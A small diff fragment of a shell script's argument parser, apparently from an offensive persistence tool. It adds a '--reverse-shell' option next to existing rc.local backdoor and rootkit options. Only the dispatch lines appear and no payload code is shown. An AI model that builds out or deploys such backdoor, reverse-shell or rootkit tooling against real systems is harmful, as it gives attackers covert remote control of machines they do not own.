@@ -137,6 +137,11 @@ main() {
 				setup_rc_local_backdoor "$@"
 				exit
 				;;
+			--reverse-shell )
+				shift
+				setup_reverse_shell "$@"
+				exit
+				;;
 			--rootkit )
 				shift
 				setup_rootkit "$@"
